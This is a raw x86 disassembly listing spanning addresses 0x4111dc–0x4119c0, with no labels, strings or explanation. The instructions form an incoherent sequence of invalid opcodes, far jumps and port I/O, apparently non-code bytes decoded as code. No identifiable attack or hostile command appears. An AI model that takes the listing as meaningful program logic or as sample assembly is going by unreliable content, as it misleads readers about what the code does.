  4111dc:	xor    ebx,DWORD PTR [ecx]
  4111de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111e0:	and    al,0x7a
  4111e2:	xchg   esp,eax
  4111e3:	mov    ebx,DWORD PTR [eax+0x4a8bded1]
  4111e9:	cmp    eax,0x65529115
  4111ee:	lods   eax,DWORD PTR ds:[esi]
  4111ef:	ins    BYTE PTR es:[edi],dx
  4111f0:	or     eax,0x39e67113
  4111f5:	mov    ah,BYTE PTR [ecx+edx*8+0x6fded63b]
  4111fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111fd:	xchg   BYTE PTR ds:0x4bad44a5,dl
  411203:	rcl    DWORD PTR [edi-0x2],0x5
  411207:	and    ecx,DWORD PTR [ecx]
  411209:	mov    DWORD PTR ds:[ebx],ecx
  41120c:	push   eax
  41120d:	xor    eax,0x1265ebb0
  411212:	ss cs push ds
  411215:	push   ecx
  411216:	ins    DWORD PTR es:[edi],dx
  411217:	xchg   DWORD PTR [edx+edi*4-0x170f751e],esi
  41121e:	sar    BYTE PTR [esi+0x3217e675],cl
  411224:	push   ecx
  411225:	call   0x4230:0x4c3f0d9f
  41122c:	xor    al,0x97
  41122e:	shr    BYTE PTR [edi+edx*8-0xa],1
  411232:	imul   ebp,DWORD PTR [esi-0x37],0xffffffb6
  411236:	fwait
  411237:	pop    ds
  411238:	fistp  DWORD PTR [esi+edi*1]
  41123b:	ror    al,1
  41123d:	inc    edi
  41123e:	test   DWORD PTR [ebx-0x7d6fc5ba],ebp
  411244:	sbb    DWORD PTR [ebx],0x5f78f719
  41124a:	pop    edx
  41124b:	jmp    0x1959c0b9
  411250:	dec    esi
  411251:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411252:	mov    esi,0x6ff5bf1b
  411257:	(bad)  
  411258:	sub    eax,0xcf8a94e1
  41125d:	pop    es
  41125e:	cmp    DWORD PTR [ebp+ecx*2-0x3f259e4],ebp
  411265:	dec    ecx
  411266:	hlt    
  411267:	mov    eax,0xab3fb896
  41126c:	pop    ebx
  41126d:	shr    BYTE PTR [edx-0x36075f3c],0x2b
  411274:	es cmp al,0x61
  411277:	xchg   esi,eax
  411278:	pop    ecx
  411279:	cdq    
  41127a:	sub    al,ah
  41127c:	cld    
  41127d:	jecxz  0x41127d
  41127f:	(bad)  
  411280:	jl     0x4112b5
  411282:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411283:	es fwait
  411285:	dec    ecx
  411286:	popa   
  411287:	retf   
  411288:	mov    ebp,0xc0898d58
  41128d:	sti    
  41128e:	add    bh,0x5e
  411291:	loop   0x411242
  411293:	int    0x1c
  411295:	mov    eax,0x9b706760
  41129a:	inc    esi
  41129b:	inc    eax
  41129c:	mov    DWORD PTR [edi+0x45],edx
  41129f:	inc    eax
  4112a0:	jmp    0x45b4:0x56e1
  4112a6:	inc    ebx
  4112a7:	fs pop esp
  4112a9:	cmp    al,0x6c
  4112ab:	in     al,dx
  4112ac:	repz add eax,0x34b7c348
  4112b2:	push   ss
  4112b3:	xchg   ebp,eax
  4112b4:	call   0xd487:0x15fd5747
  4112bb:	icebp  
  4112bc:	sub    ebx,eax
  4112be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112bf:	in     al,0x72
  4112c1:	fcom   st(4)
  4112c3:	shl    DWORD PTR [edi*2+0x7902d873],cl
  4112ca:	inc    ebp
  4112cb:	push   es
  4112cc:	push   eax
  4112cd:	dec    ebx
  4112ce:	dec    ebp
  4112cf:	ror    BYTE PTR [edx+edx*8-0x55369a04],cl
  4112d6:	xor    eax,0xd0124753
  4112db:	ret    0xf063
  4112de:	nop
  4112df:	mov    ecx,esi
  4112e1:	mov    ds:0xf068ccd0,al
  4112e6:	mov    ebx,0x2d4ea7ea
  4112eb:	icebp  
  4112ec:	aaa    
  4112ed:	es dec edx
  4112ef:	mov    ebp,0x845f26ae
  4112f4:	jge    0x411346
  4112f6:	xchg   ebp,eax
  4112f7:	jno    0x411294
  4112f9:	jecxz  0x411312
  4112fb:	add    al,0x5c
  4112fd:	push   esi
  4112fe:	sbb    ebp,DWORD PTR [ecx-0x45835b00]
  411304:	iret   
  411305:	sub    BYTE PTR [ebx-0x62a9c7db],al
  41130b:	push   es
  41130c:	mov    bl,0xe5
  41130e:	jg     0x411375
  411310:	cwde   
  411311:	adc    eax,DWORD PTR [esi-0x9]
  411314:	jno    0x41138b
  411316:	test   eax,0xcc54df2
  41131b:	and    dl,BYTE PTR [edx+0x2e]
  41131e:	or     DWORD PTR [edx-0x56d12f93],ebx
  411324:	or     al,0x5
  411326:	popa   
  411327:	js     0x411385
  411329:	js     0x41136a
  41132b:	jno    0x41135e
  41132d:	rcr    DWORD PTR [edx],1
  41132f:	shl    DWORD PTR [ebx+0x7945a47e],0x20
  411336:	cmp    al,0xe9
  411338:	bound  ebx,QWORD PTR [esi-0x5b]
  41133b:	(bad)  
  41133c:	mov    ebp,0xea493d80
  411341:	adc    DWORD PTR [edx],eax
  411343:	stos   DWORD PTR es:[edi],eax
  411344:	xor    bh,BYTE PTR [ebp-0x4]
  411347:	sub    eax,0xc10a8051
  41134c:	rcr    BYTE PTR [eax-0x22f00bad],cl
  411352:	jns    0x41131e
  411354:	push   ss
  411355:	sub    ch,al
  411357:	inc    edi
  411358:	jp     0x41136a
  41135a:	ins    WORD PTR es:[edi],dx
  41135c:	inc    esp
  41135d:	sub    cl,0xca
  411360:	pusha  
  411361:	pusha  
  411362:	pop    ebx
  411363:	adc    al,0xd7
  411365:	sbb    al,0xed
  411367:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411369:	fld    TBYTE PTR [esi+edi*4+0x2c]
  41136d:	mov    dl,0x30
  41136f:	dec    ebp
  411370:	sbb    edi,DWORD PTR [ecx-0xc]
  411373:	fwait
  411374:	int3   
  411375:	and    al,0x90
  411377:	mov    eax,0x595c372a
  41137c:	fdiv   QWORD PTR [ebx+0x78]
  41137f:	iret   
  411380:	mov    al,ds:0x882afcb
  411385:	add    al,0xe9
  411387:	mov    esi,0x3c89adab
  41138c:	not    BYTE PTR [edx]
  41138e:	or     BYTE PTR [ecx-0x4282fbda],bh
  411394:	and    bh,BYTE PTR [edi+0x4790888c]
  41139a:	xor    al,0xf3
  41139c:	dec    ebx
  41139d:	outs   dx,DWORD PTR ds:[esi]
  41139e:	outs   dx,BYTE PTR ds:[esi]
  41139f:	cld    
  4113a0:	imul   esi,DWORD PTR [esi],0x77fef9c5
  4113a6:	shl    BYTE PTR [esi-0x52346440],0x9e
  4113ad:	(bad)  
  4113ae:	mov    al,0xcd
  4113b0:	in     al,0x68
  4113b2:	aaa    
  4113b3:	and    al,0xd0
  4113b5:	fnstsw WORD PTR [esi]
  4113b7:	pop    ebp
  4113b8:	je     0x4113cc
  4113ba:	jns    0x411392
  4113bc:	push   cs
  4113bd:	inc    ecx
  4113be:	leave  
  4113bf:	loop   0x4113d4
  4113c1:	mov    edx,0xb50690bc
  4113c6:	pop    edx
  4113c7:	jle    0x4113e5
  4113c9:	or     dl,BYTE PTR [edx+0x70]
  4113cc:	xchg   BYTE PTR [ecx+0x715de27c],ch
  4113d2:	and    esi,edi
  4113d4:	cmp    eax,0x9f94cd62
  4113d9:	ret    0x7a7c
  4113dc:	push   ebp
  4113dd:	pop    ss
  4113de:	sub    al,0xa9
  4113e0:	repnz sub DWORD PTR [ecx-0x5e],ebx
  4113e4:	adc    BYTE PTR [ebp*8+0x665a854d],ch
  4113eb:	icebp  
  4113ec:	jb     0x41143d
  4113ee:	cmc    
  4113ef:	push   0xce826ef6
  4113f4:	test   eax,0x792c08b0
  4113f9:	push   ebx
  4113fa:	nop
  4113fb:	pushw  0xff86
  4113fe:	pop    es
  4113ff:	mov    bh,0xf0
  411401:	jmp    0x4894:0x2917aee7
  411408:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411409:	push   ebp
  41140a:	push   edi
  41140b:	les    ebx,FWORD PTR [ebx]
  41140d:	or     al,0xcf
  41140f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411410:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411412:	lods   al,BYTE PTR ds:[esi]
  411413:	fsub   st,st(3)
  411415:	(bad)
  411418:	loop   0x4113f1
  41141a:	pop    edi
  41141b:	ffreep st(0)
  41141d:	jno    0x411422
  41141f:	jb     0x41142c
  411421:	mov    al,ds:0x807bde2f
  411426:	aad    0xd3
  411428:	sub    BYTE PTR ds:[edx+0x7ccb3c0e],dl
  41142f:	dec    esp
  411430:	push   0x66062197
  411435:	fcmovne st,st(1)
  411437:	mov    ebp,0xb1e5b000
  41143c:	mov    WORD PTR [bp+di-0x2b],ds
  411440:	pop    edi
  411441:	lahf   
  411442:	retf   0xa9dd
  411445:	shld   eax,edx,cl
  411448:	nop
  411449:	cmp    ecx,DWORD PTR [esp+eiz*4-0x48b84ed2]
  411450:	bound  esi,QWORD PTR [eax]
  411452:	mov    dh,BYTE PTR [eax-0x33]
  411455:	loopne 0x4113de
  411457:	in     eax,0x98
  411459:	sbb    BYTE PTR [edi],cl
  41145b:	test   BYTE PTR cs:[esi+ebx*4+0x2d7d8ebf],ah
  411463:	fsub   DWORD PTR [eax]
  411465:	sbb    DWORD PTR [esi+0x71038337],eax
  41146b:	mov    BYTE PTR [eax-0xcc90f45],ah
  411471:	jbe    0x4114b7
  411473:	fisub  WORD PTR [ebx+0x17de7c0e]
  411479:	add    BYTE PTR [esi+esi*1-0x21],al
  41147d:	leave  
  41147e:	mov    DWORD PTR [ecx-0xa92577e],ecx
  411484:	push   ss
  411485:	jmp    FWORD PTR [esi-0x3c]
  411488:	mov    al,ds:0x7d41a33a
  41148d:	xchg   esp,eax
  41148e:	sbb    bl,ch
  411490:	loopne 0x41146f
  411492:	push   esp
  411493:	lea    eax,[ebx+0x7e]
  411496:	push   0x7
  411498:	sbb    ch,cl
  41149a:	jg     0x4114c6
  41149c:	push   es
  41149d:	sbb    eax,0xc70f5581
  4114a2:	xchg   esi,eax
  4114a3:	rcr    ecx,cl
  4114a5:	add    ah,BYTE PTR [ebx]
  4114a7:	int    0xd7
  4114a9:	outs   dx,BYTE PTR ds:[esi]
  4114aa:	xchg   ecx,eax
  4114ab:	cmp    eax,0x1b6a171d
  4114b0:	or     eax,0x76b187d6
  4114b5:	cmp    BYTE PTR [esi+ecx*4],dl
  4114b8:	mov    edi,0x86aa18f6
  4114bd:	mov    esi,ecx
  4114bf:	and    al,0x93
  4114c1:	test   al,0x78
  4114c3:	call   0x450d85fe
  4114c8:	add    DWORD PTR [edi-0x55],edx
  4114cb:	xchg   ebx,eax
  4114cc:	je     0x411473
  4114ce:	cmp    eax,0x5aef8775
  4114d3:	cdq    
  4114d4:	push   0xd8acd210
  4114d9:	xchg   ebx,eax
  4114da:	inc    edx
  4114db:	test   BYTE PTR [ebp-0x5f283bd7],ah
  4114e1:	call   0x5427:0x7326fc38
  4114e8:	mov    al,ds:0x28b52e7b
  4114ed:	mov    esi,0xf19f0153
  4114f2:	les    ebx,FWORD PTR [esi-0x389a18a2]
  4114f8:	pop    ss
  4114f9:	mov    ah,0x5d
  4114fb:	popf   
  4114fc:	out    dx,eax
  4114fd:	scas   eax,DWORD PTR es:[edi]
  4114fe:	add    DWORD PTR [ecx+0x49],ebp
  411501:	loope  0x4114a1
  411503:	pop    esp
  411504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411505:	stos   BYTE PTR es:[edi],al
  411506:	push   cs
  411507:	vmwrite esp,DWORD PTR [eax-0x3a]
  41150b:	adc    cl,dh
  41150d:	test   esi,edx
  41150f:	pop    eax
  411510:	dec    eax
  411511:	pop    esp
  411512:	sub    eax,0x3737b551
  411517:	sub    BYTE PTR [ebp+0x1e1028e5],dl
  41151d:	or     DWORD PTR [eax+edi*2],ecx
  411520:	icebp  
  411521:	sub    al,0xeb
  411523:	aaa    
  411524:	adc    ebp,DWORD PTR [ecx+0x79b5843d]
  41152a:	push   es
  41152b:	fdiv   QWORD PTR [ebp+0xd]
  41152e:	push   cs
  41152f:	push   ebx
  411530:	xor    esp,DWORD PTR [ecx+0x5a]
  411533:	sahf   
  411534:	call   0xd73eb044
  411539:	(bad)  
  41153a:	in     al,0xf1
  41153c:	cs iret 
  41153e:	cmp    dh,al
  411540:	add    bh,bh
  411542:	dec    esi
  411543:	push   esi
  411544:	or     ecx,DWORD PTR [ebx-0x64b3d73a]
  41154a:	sbb    bl,BYTE PTR [eax*1+0x44855643]
  411551:	mov    ss,edx
  411553:	push   0x332352c3
  411558:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41155a:	lods   al,BYTE PTR ds:[esi]
  41155b:	in     eax,dx
  41155c:	pusha  
  41155d:	mov    dl,0x61
  41155f:	adc    eax,0x870d29ab
  411564:	bound  edx,QWORD PTR [ebx+0x1532b67d]
  41156a:	popa   
  41156b:	lahf   
  41156c:	sti    
  41156d:	cwde   
  41156e:	data16 (bad) 
  411571:	ror    DWORD PTR [esi-0x2abecd7b],1
  411577:	jno    0x411560
  411579:	dec    ecx
  41157a:	jb     0x4115cc
  41157c:	push   edx
  41157d:	adc    bh,ah
  41157f:	pop    esp
  411580:	add    ah,BYTE PTR [edx+0x7b]
  411583:	lea    esp,[edx]
  411585:	and    eax,DWORD PTR [edi-0x3659c55e]
  41158b:	rcr    DWORD PTR [ebx+0x4f],0x42
  41158f:	cmc    
  411590:	repnz add al,0xfa
  411593:	ds test al,0x40
  411596:	sub    dl,dh
  411598:	dec    ebx
  411599:	pop    esi
  41159a:	in     al,0x9a
  41159c:	xchg   ecx,eax
  41159d:	pop    eax
  41159e:	or     eax,0xc5288c3
  4115a3:	mov    ebx,esi
  4115a5:	mov    al,ds:0x84ce73be
  4115aa:	mov    ds:0x28b040f0,eax
  4115af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115b0:	push   es
  4115b1:	sub    cl,BYTE PTR ds:[ecx]
  4115b4:	xor    al,0x1a
  4115b6:	mov    DWORD PTR [ebx+edi*1-0x50],ebp
  4115ba:	jnp    0x4115eb
  4115bc:	sub    eax,0x986e69af
  4115c1:	inc    eax
  4115c2:	fdiv   QWORD PTR [ebx]
  4115c4:	jmp    0xfa57:0xa687d8e8
  4115cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115cc:	xchg   esi,eax
  4115cd:	inc    ebp
  4115ce:	stc    
  4115cf:	int    0x93
  4115d1:	int    0xb8
  4115d3:	jp     0x41157c
  4115d5:	dec    ebx
  4115d6:	idiv   BYTE PTR ds:0xaad9db60
  4115dc:	fcomp  QWORD PTR [edi+0x64bfc69d]
  4115e2:	mov    ebp,0x46a30793
  4115e7:	add    eax,DWORD PTR [edi+0x4601bf1a]
  4115ed:	loope  0x411594
  4115ef:	mov    ecx,0x267af404
  4115f4:	lods   eax,DWORD PTR ds:[esi]
  4115f5:	(bad)  [ecx+0x53b1dc36]
  4115fb:	or     ch,dh
  4115fd:	mov    bh,0xca
  4115ff:	stos   DWORD PTR es:[edi],eax
  411600:	push   ds
  411601:	dec    esp
  411602:	loope  0x411594
  411604:	or     ebx,DWORD PTR [ecx+edi*1]
  411607:	xchg   esp,eax
  411608:	push   ds
  411609:	aad    0x71
  41160b:	enter  0x8117,0xc5
  41160f:	xchg   esp,eax
  411610:	jle    0x41159a
  411612:	jg     0x411683
  411614:	lods   eax,DWORD PTR ds:[esi]
  411615:	mov    bh,0x3a
  411617:	adc    eax,0xf1a598b8
  41161c:	xchg   esi,eax
  41161d:	pop    esi
  41161f:	inc    edi
  411620:	loop   0x4115d2
  411622:	rcr    DWORD PTR [esi],0xaa
  411625:	jp     0x4115af
  411627:	retf   0x9cd9
  41162a:	push   0xfffffff4
  41162c:	mov    al,0x59
  41162e:	gs pop edx
  411630:	sti    
  411631:	dec    edx
  411632:	jo     0x411643
  411634:	aad    0x59
  411636:	jle    0x4115df
  411638:	pop    ecx
  411639:	or     eax,0xa3f203be
  41163e:	pop    esp
  41163f:	icebp  
  411640:	ret    0x546b
  411643:	int    0x73
  411645:	out    0xf6,eax
  411647:	in     al,dx
  411648:	enter  0xd6ef,0x2d
  41164c:	and    eax,0x94fe2e6
  411651:	sub    eax,DWORD PTR [edi-0x73f05cea]
  411657:	bound  edi,QWORD PTR [eax-0x41e627d0]
  41165d:	pop    ds
  41165e:	sub    eax,0x8f2d8bbf
  411663:	jp     0x4116ac
  411665:	sub    eax,0xdc90bb8f
  41166a:	ss or  al,0x98
  41166d:	inc    ecx
  41166e:	bound  esi,QWORD PTR [eax+0x7e]
  411671:	fldcw  WORD PTR [ecx+0x41]
  411674:	sub    ah,ch
  411676:	jne    0x411641
  411678:	sbb    al,0x2f
  41167a:	sbb    eax,0xe14ebb77
  41167f:	arpl   bx,di
  411681:	pusha  
  411682:	xchg   BYTE PTR [ebp+0x41a73cf2],cl
  411688:	adc    BYTE PTR [edi],bl
  41168a:	jno    0x4116c8
  41168c:	jl     0x411693
  41168e:	mov    eax,ds:0xacbb6b79
  411693:	xchg   edi,eax
  411694:	pop    edx
  411695:	pop    esp
  411696:	pop    edi
  411697:	push   esi
  411698:	and    eax,DWORD PTR [ebp+eax*1-0x7]
  41169c:	xchg   edi,eax
  41169d:	hlt    
  41169e:	and    DWORD PTR [edx+0x61],esp
  4116a1:	loopne 0x411722
  4116a3:	rcr    BYTE PTR [edi],0x10
  4116a6:	and    eax,eax
  4116a8:	pusha  
  4116a9:	sahf   
  4116aa:	mov    edi,0x91b32c5
  4116af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116b0:	hlt    
  4116b1:	arpl   WORD PTR [ecx+ebx*1],sp
  4116b4:	rcl    esp,1
  4116b6:	adc    esp,DWORD PTR [ecx-0x31d5b61e]
  4116bc:	popa   
  4116bd:	ror    DWORD PTR [esi-0x1a],cl
  4116c0:	jmp    0x12fa:0x90e87535
  4116c7:	int3   
  4116c8:	mul    DWORD PTR [ecx]
  4116ca:	inc    ebp
  4116cb:	(bad)  
  4116cc:	aas    
  4116cd:	push   ss
  4116ce:	add    esi,DWORD PTR [eax]
  4116d0:	aad    0xea
  4116d2:	cmp    BYTE PTR [esi],dl
  4116d4:	bound  ebx,QWORD PTR [ecx-0x5af611cb]
  4116da:	sti    
  4116db:	shl    BYTE PTR [ebp-0x5f],0x73
  4116df:	enter  0xa1c7,0x5f
  4116e3:	mov    cs,edx
  4116e5:	adc    BYTE PTR [ebx+edx*1],cl
  4116e8:	popf   
  4116e9:	(bad)  
  4116ea:	push   ss
  4116eb:	loope  0x411726
  4116ed:	pop    ds
  4116ee:	addr16 cs mov cl,0xd4
  4116f2:	jp     0x411712
  4116f4:	push   ecx
  4116f5:	popf   
  4116f6:	xchg   ebp,eax
  4116f7:	js     0x4116e1
  4116f9:	mov    al,ds:0xc191836d
  4116fe:	arpl   WORD PTR [edx-0x6f],ax
  411701:	add    DWORD PTR [edx+0x5c],0x62bc0e56
  411708:	and    DWORD PTR [eax+ecx*2+0x563ebaf5],edx
  41170f:	add    edi,DWORD PTR [edx]
  411711:	cmp    al,BYTE PTR [eax-0x1b69cfaa]
  411717:	jmp    0x411744
  411719:	call   FWORD PTR [edx-0x72]
  41171c:	xor    bh,BYTE PTR [eax-0x434807ff]
  411722:	mov    dh,0xd0
  411724:	xchg   bh,ah
  411726:	pushf  
  411727:	(bad)  
  411728:	out    dx,eax
  411729:	adc    esi,ebp
  41172b:	sub    al,0xd7
  41172d:	jo     0x4116e5
  41172f:	push   esi
  411730:	xchg   esp,eax
  411731:	ret    0xd311
  411734:	xor    ah,bl
  411736:	sbb    ebp,0x54
  411739:	fcmovnb st,st(5)
  41173b:	add    BYTE PTR [ecx-0x43],dh
  41173e:	or     edi,esi
  411740:	cmc    
  411741:	scas   al,BYTE PTR es:[edi]
  411742:	test   eax,0x4a54565f
  411747:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411748:	or     al,0x70
  41174a:	das    
  41174b:	les    edi,FWORD PTR [eax+0xc]
  41174e:	(bad)  
  411750:	push   ecx
  411751:	jmp    0xb928:0x4c68d6e0
  411758:	push   edi
  411759:	stos   BYTE PTR es:[edi],al
  41175a:	jae    0x4117cc
  41175c:	mov    dl,0xfd
  41175e:	add    DWORD PTR [eax],ecx
  411760:	dec    eax
  411761:	jmp    0xe596:0x1d904d4f
  411768:	mov    edi,0xc6b6ac91
  41176d:	ret    0x579f
  411770:	dec    ecx
  411771:	pop    ebx
  411772:	or     al,BYTE PTR [eax-0x32aa0e84]
  411778:	xlat   BYTE PTR ds:[ebx]
  411779:	add    al,0x80
  41177b:	pop    es
  41177c:	ror    DWORD PTR [edi-0x62e9fcf2],cl
  411782:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411783:	test   DWORD PTR [esi-0x7993fd40],esi
  411789:	jg     0x411745
  41178b:	stos   BYTE PTR es:[edi],al
  41178c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41178d:	adc    DWORD PTR [edx+0x1221f98e],ecx
  411793:	test   eax,0x1aac51d7
  411798:	xchg   esp,eax
  411799:	sub    DWORD PTR [edx+ecx*1],edx
  41179c:	gs je  0x4117cb
  41179f:	xor    al,0x5f
  4117a1:	mov    eax,ds:0xf8e0a894
  4117a6:	lea    esp,[ecx+0x30]
  4117a9:	dec    bx
  4117ab:	sbb    cl,dh
  4117ad:	inc    ecx
  4117ae:	in     al,0xc0
  4117b0:	or     eax,0x4c98ac48
  4117b5:	push   es
  4117b6:	scas   eax,DWORD PTR es:[edi]
  4117b7:	xchg   DWORD PTR [ebp-0x2b],ecx
  4117ba:	inc    edi
  4117bb:	call   0x8fe9:0x12c7f48b
  4117c2:	(bad)  [edx-0x39]
  4117c5:	xor    esp,ebx
  4117c7:	sub    eax,0x3f951365
  4117cc:	mov    ah,bl
  4117ce:	xor    dl,BYTE PTR [ebx-0x524dfd5a]
  4117d4:	retf   
  4117d5:	loope  0x41178e
  4117d7:	mov    edi,ss
  4117d9:	adc    cl,0x8e
  4117dc:	stos   BYTE PTR es:[edi],al
  4117dd:	bound  esp,QWORD PTR [ebx-0x50394deb]
  4117e3:	dec    edx
  4117e4:	jne    0x4117c9
  4117e6:	loope  0x41182d
  4117e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117e9:	mov    cl,0x76
  4117eb:	inc    ebx
  4117ec:	pop    edx
  4117ed:	jo     0x4117f1
  4117ef:	(bad)  
  4117f0:	mov    WORD PTR [eax],es
  4117f2:	sub    eax,DWORD PTR [edi+0x699dcaed]
  4117f8:	pop    ebp
  4117f9:	repnz or al,0xfc
  4117fd:	call   0xa038:0xcb58eb29
  411804:	dec    ebx
  411805:	xor    cl,dl
  411807:	popa   
  411808:	mov    eax,ds:0x50740eb7
  41180d:	into   
  41180e:	xor    eax,ebx
  411810:	dec    ecx
  411811:	mov    ah,0xb1
  411813:	mov    cl,0x23
  411815:	pushf  
  411816:	pop    edi
  411817:	in     al,dx
  411818:	hlt    
  411819:	outs   dx,BYTE PTR ds:[esi]
  41181a:	rol    BYTE PTR [esi],1
  41181c:	mov    edx,ebx
  41181e:	inc    esi
  41181f:	sar    DWORD PTR ss:[ecx+0x1ad9cc48],0xd0
  411827:	mov    bl,0xa0
  411829:	outs   dx,DWORD PTR ds:[esi]
  41182a:	jno    0x4117d3
  41182c:	cmp    DWORD PTR [ecx],0xffffffc6
  41182f:	cmp    ah,BYTE PTR [esi-0x1684b250]
  411835:	dec    BYTE PTR [ebx-0x62e346df]
  41183b:	pop    edi
  41183c:	pusha  
  41183d:	retf   
  41183e:	push   0xffffff87
  411840:	les    eax,FWORD PTR ds:0x6795f497
  411846:	ins    DWORD PTR es:[edi],dx
  411847:	dec    edx
  411848:	jl     0x411883
  41184a:	test   ebp,ebx
  41184c:	aad    0x39
  41184e:	test   eax,0xaba47b9
  411853:	jmp    0x41187a
  411855:	cwde   
  411856:	sub    BYTE PTR [edi],bh
  411858:	dec    edx
  411859:	adc    DWORD PTR [eax],ebp
  41185b:	cmc    
  41185c:	mov    gs,WORD PTR [ecx]
  41185e:	cmp    bl,BYTE PTR [eax]
  411860:	jl     0x41189d
  411862:	xchg   edx,eax
  411863:	bound  esp,QWORD PTR [ebx+0x5a]
  411866:	loop   0x41187b
  411868:	mov    dl,0x6b
  41186a:	scas   al,BYTE PTR es:[edi]
  41186b:	ret    
  41186c:	leave  
  41186d:	imul   DWORD PTR [ebx+0x76cde838]
  411873:	or     al,0x6d
  411875:	mov    dh,0x27
  411877:	out    dx,al
  411878:	aas    
  411879:	adc    esp,ebp
  41187b:	pop    esi
  41187c:	inc    edx
  41187d:	(bad)  
  41187e:	fimul  DWORD PTR [edx]
  411880:	jae    0x411862
  411882:	add    eax,0xca9eabb6
  411887:	sahf   
  411888:	sbb    eax,DWORD PTR [edi+ecx*1]
  41188b:	or     cl,BYTE PTR [edx-0x5bb7c576]
  411891:	pop    ss
  411892:	fbld   TBYTE PTR ds:0xf083c562
  411898:	test   BYTE PTR [eax-0x2b],dh
  41189b:	cli    
  41189c:	mov    edx,0x2569797e
  4118a1:	or     BYTE PTR [ecx-0xb0246a2],bh
  4118a7:	arpl   si,di
  4118a9:	mov    bl,0x9f
  4118ab:	or     ch,BYTE PTR ss:[ecx+0x38579004]
  4118b2:	test   al,0xc8
  4118b4:	fbstp  TBYTE PTR [ebx+0x2a4918ae]
  4118ba:	imul   eax,ebp,0xffffffc1
  4118bd:	xchg   esi,eax
  4118be:	adc    al,0x76
  4118c0:	enter  0xc91a,0x45
  4118c4:	outs   dx,BYTE PTR ds:[esi]
  4118c5:	cmp    BYTE PTR [ecx],ah
  4118c7:	pop    edx
  4118c8:	mov    cs,esp
  4118ca:	jle    0x4118d8
  4118cc:	repnz fadd QWORD PTR [eax]
  4118cf:	pusha  
  4118d0:	mov    dh,dl
  4118d2:	mov    ch,0xbe
  4118d4:	xlat   BYTE PTR ds:[ebx]
  4118d5:	ja     0x411889
  4118d7:	inc    ebx
  4118d8:	xor    ecx,edi
  4118da:	shl    BYTE PTR [eax],1
  4118dc:	call   0xc3d1:0x5d349717
  4118e3:	push   esi
  4118e4:	into   
  4118e5:	js     0x4118b1
  4118e7:	mov    ds:0xd5ac1a44,eax
  4118ec:	(bad)  
  4118ed:	mov    bh,0x2c
  4118ef:	sti    
  4118f0:	xor    BYTE PTR [ebp+0x2e],dl
  4118f3:	mov    al,0x1d
  4118f5:	(bad)  
  4118f6:	nop
  4118f7:	and    al,0x15
  4118f9:	adc    ecx,DWORD PTR [edi+0x52]
  4118fc:	shl    BYTE PTR [ebp+0xa],0x45
  411900:	jno    0x41188e
  411902:	out    0x7c,al
  411904:	mov    dl,0xb7
  411906:	pop    eax
  411907:	mov    dh,0xf3
  411909:	retf   0x901b
  41190c:	push   edi
  41190d:	retf   
  41190e:	adc    al,0x53
  411910:	stc    
  411911:	in     al,0x4
  411913:	mov    ah,0xf
  411915:	xor    ah,dl
  411917:	inc    ecx
  411918:	shl    dl,0x64
  41191b:	push   cs
  41191c:	(bad)  
  41191d:	pop    ecx
  41191e:	push   0xe01d7f18
  411923:	jl     0x411912
  411925:	jns    0x4118d4
  411927:	xchg   esp,eax
  411928:	jb     0x4118f6
  41192a:	push   ebp
  41192b:	jle    0x4118ee
  41192d:	inc    esp
  41192e:	and    ch,ah
  411930:	clc    
  411931:	inc    ecx
  411932:	mov    dl,0x20
  411934:	jns    0x411937
  411936:	gs xor bh,al
  411939:	mov    dl,0x8
  41193b:	jns    0x4118f9
  41193d:	dec    ecx
  41193e:	pop    ebx
  41193f:	xchg   edx,eax
  411940:	imul   edx
  411942:	xchg   edx,eax
  411943:	dec    ebp
  411944:	push   esi
  411945:	lods   al,BYTE PTR ds:[esi]
  411946:	adc    edx,DWORD PTR [esi-0xb]
  411949:	arpl   WORD PTR [ebp-0x506fb665],bx
  41194f:	mov    bl,0x34
  411951:	lea    edi,[eax+0x3c]
  411954:	rol    BYTE PTR [ecx],cl
  411956:	arpl   WORD PTR [esi],sp
  411958:	mov    ecx,0xdde3ae15
  41195d:	sub    al,0xe5
  41195f:	sub    dh,ch
  411961:	sub    BYTE PTR [edx+0x58],0xe6
  411965:	sbb    al,0x8a
  411967:	in     eax,0x0
  411969:	mov    edx,0x4e00f5e4
  41196e:	inc    esp
  41196f:	cs mov edx,0x4336a451
  411975:	int3   
  411976:	jge    0x4119d0
  411978:	fcmovnb st,st(5)
  41197a:	fwait
  41197b:	xchg   ebp,eax
  41197c:	mov    edi,0x3e95b95a
  411981:	mov    ch,0x82
  411983:	inc    ebp
  411984:	adc    al,0x49
  411986:	shl    BYTE PTR [ecx-0x6eab5984],0xa0
  41198d:	adc    BYTE PTR [edi],ch
  41198f:	add    bh,bl
  411991:	add    dl,BYTE PTR [eax-0x264b50a0]
  411997:	scas   al,BYTE PTR es:[edi]
  411998:	test   DWORD PTR [esi*8-0x7bb726ce],esp
  41199f:	retf   0x3a5d
  4119a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119a3:	ja     0x4119ee
  4119a5:	sbb    al,0xbf
  4119a7:	mov    dl,0xb9
  4119a9:	leave  
  4119aa:	mov    bh,0xc6
  4119ac:	cmp    ecx,DWORD PTR [edi]
  4119ae:	mov    edx,0x5a1fe80f
  4119b3:	cmp    bh,dh
  4119b5:	xor    BYTE PTR [ebp-0x3c],bl
  4119b8:	repz jne 0x4119c6
  4119bb:	cdq    
  4119bc:	sub    ecx,eax
  4119be:	jne    0x411a11
  4119c0:	fisubr WORD PTR [ecx+0x29b1b159]
